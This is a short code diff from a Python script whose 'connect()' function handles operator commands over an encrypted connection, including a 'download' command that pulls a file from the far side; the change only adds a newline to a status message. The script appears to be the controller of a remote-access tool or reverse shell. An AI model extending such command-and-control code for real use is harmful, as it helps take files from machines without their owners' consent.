@@ -88,7 +88,7 @@ def connect():
             sleep(2.5)
         elif command[:8] == 'download':
             conn.send(encrypt(command.encode()))
-            print(f'\n\t[!] Downloading file: {command[9:]}')
+            print(f'\n\t[!] Downloading file: {command[9:]}\n')
             download(command[9:])
             print(f'\t[!] {command[9:]} download complete\n')
         elif command == 'help':
